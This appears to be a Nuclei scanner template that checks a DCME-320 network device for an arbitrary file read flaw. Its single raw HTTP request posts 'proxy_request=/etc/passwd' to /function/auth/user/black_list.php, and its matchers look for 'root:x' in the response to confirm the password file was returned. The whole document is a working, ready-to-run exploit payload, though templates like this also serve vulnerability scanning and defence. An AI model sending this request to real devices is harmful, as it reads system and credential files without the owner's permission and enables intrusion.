id: ShenZhouDCME-320-black_list-ReadAnyFile

info:
  name: ShenZhouDCME-320-black_list-ReadAnyFile
  author: iSee857
  severity: high
  description: ShenZhouDCME-320-black_list-ReadAnyFile

requests:
  - method: POST
    raw:
      - |
        POST /function/auth/user/black_list.php HTTP/1.1
        Host: {{Host}}
        Accept: */*
        Content-type: application/x-www-form-urlencoded
        Connection: close

        proxy_request=/etc/passwd

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "bin"
          - "root:x"
        condition: and
        part: body

      - type: status
        status:
          - 200